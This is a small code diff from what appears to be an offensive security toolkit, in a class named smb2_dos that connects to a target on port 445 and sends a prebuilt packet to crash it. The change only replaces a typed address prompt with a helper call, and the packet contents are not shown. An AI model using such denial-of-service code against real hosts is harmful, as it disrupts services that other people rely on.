@@ -37,7 +37,7 @@ class smb2_dos(DoS):
 
 			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			
-			self.target = raw_input('[!] Address to DoS: ')
+			self.get_ip()
 			sock.connect((self.target, 445))
 			sock.send(pkt)
 			sock.close()
